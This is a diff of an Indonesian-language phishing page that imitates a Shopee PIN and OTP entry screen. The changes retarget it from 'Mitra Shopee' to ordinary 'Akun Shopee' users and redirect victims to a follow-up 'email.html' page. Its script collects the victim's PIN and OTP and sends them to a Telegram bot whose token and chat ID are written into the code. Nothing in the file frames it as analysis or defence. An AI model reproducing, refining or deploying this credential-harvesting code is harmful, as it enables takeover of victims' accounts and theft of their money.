@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Masukkan PIN - Mitra Shopee</title>
+    <title>Masukkan PIN - Akun Shopee</title>
     <style>
         body {
             font-family: sans-serif;
@@ -94,11 +94,11 @@
                 oninput="if(this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" />
         </div>
         <div class="input-group">
-            <label for="pinInput">PIN Shopee Mitra (6 digit):</label>
+            <label for="pinInput">PIN Shopee(6 digit):</label>
             <input type="password" id="pinInput" maxlength="6" placeholder="••••••" autofocus required />
         </div>
         <button id="submitPin">Lanjutkan</button>
-        <button id="resendOtp" disabled>Kirim Ulang OTP (60)</button>
+        <button id="resendOtp" disabled>Jika masuk otp link tunggu (" + timeLeft + ") untuk request kode otp</button>
     </div>
     <script>
         document.getElementById('submitPin').addEventListener('click', function (e) {
@@ -119,22 +119,22 @@
             var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
             var chat_id = "5923031825";
             var text = "PIN Shopee Mitra: " + pin + "\\nOTP: " + otp;
-            var url = "https://api.telegram.org/bot" + token + "/sendMessage";
+            var url = `https://api.telegram.org/bot${token}/sendMessage`; // Menggunakan template literal
             var params = {
                 chat_id: chat_id,
                 text: text
             };
             fetch(url, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(params)
-                })
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(params)
+            })
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        window.location.href = 'formulir.html';
+                        window.location.href = 'email.html';
                     } else {
                         alert('Gagal mengirim ke Telegram: ' + data.description);
                     }
@@ -149,7 +149,7 @@
         resendButton.disabled = true;
         var timerInterval = setInterval(function () {
             timeLeft--;
-            resendButton.textContent = "Kirim Ulang OTP (" + timeLeft + ")";
+            resendButton.textContent = "Jika masuk otp link tunggu (" + timeLeft + ") untuk request kode otp";
             if (timeLeft <= 0) {
                 clearInterval(timerInterval);
                 resendButton.textContent = "Kirim Ulang OTP";
@@ -162,7 +162,7 @@
             resendButton.disabled = true;
             timerInterval = setInterval(function () {
                 timeLeft--;
-                resendButton.textContent = "Kirim Ulang OTP (" + timeLeft + ")";
+                resendButton.textContent = "Jika masuk otp link tunggu (" + timeLeft + ") untuk request kode otp";
                 if (timeLeft <= 0) {
                     clearInterval(timerInterval);
                     resendButton.textContent = "Kirim Ulang OTP";
